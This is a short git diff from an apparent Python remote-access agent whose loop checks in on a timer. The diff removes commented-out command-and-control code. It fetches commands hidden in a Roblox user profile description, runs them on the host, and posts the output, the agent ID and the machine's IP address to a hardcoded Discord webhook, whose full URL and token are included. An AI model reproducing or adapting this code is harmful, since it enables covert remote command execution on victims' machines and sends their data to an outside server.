@@ -87,25 +87,3 @@ while alive:
     time.sleep(check_task_res['check_in_time'])
 
 
-
-
-# original_string = robloxpy.User.External.GetDescription(5266533844)
-
-
-# split_by_ampersand = original_string.split('&')
-
-# description_array = [part.split('|') for part in split_by_ampersand]
-
-# for i, part in enumerate(description_array):
-#     temp = part[0].strip()
-#     command = part[1].strip()
-#     if temp == agent_name:
-#         data = {
-#             "embeds" : [{
-#                 "color" : (0x09FF00),
-#                 "description" : f"AgentID : {agent_name}\nIP Address : {ip.get()}\nResult for the command : {command}\n```{str(run_cmd(command,timeout=5))}```",
-#                 "title" : f"Response Detected!"
-#             }]
-#         }
-#         result = requests.post('https://discord.com/api/webhooks/1169507656923365438/blvon35hqLKWwdrHIt2rEbH9_8gYu2svnGJsmKHywP5ihhaiToXfBlItWmFNTfdrzFP9', headers={'Content-Type': 'application/json'}, json=data)
-
